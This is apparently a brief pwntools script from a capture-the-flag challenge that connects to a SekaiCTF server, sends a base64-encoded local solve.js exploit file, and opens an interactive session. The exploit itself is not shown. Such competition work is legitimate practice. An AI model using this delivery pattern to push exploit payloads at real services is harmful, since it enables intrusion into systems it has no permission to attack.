from pwn import *
import base64


io = remote('3in1.chals.sekai.team', 1337)
io.sendline(base64.b64encode(open('./solve.js','r').read().encode()))
io.interactive()
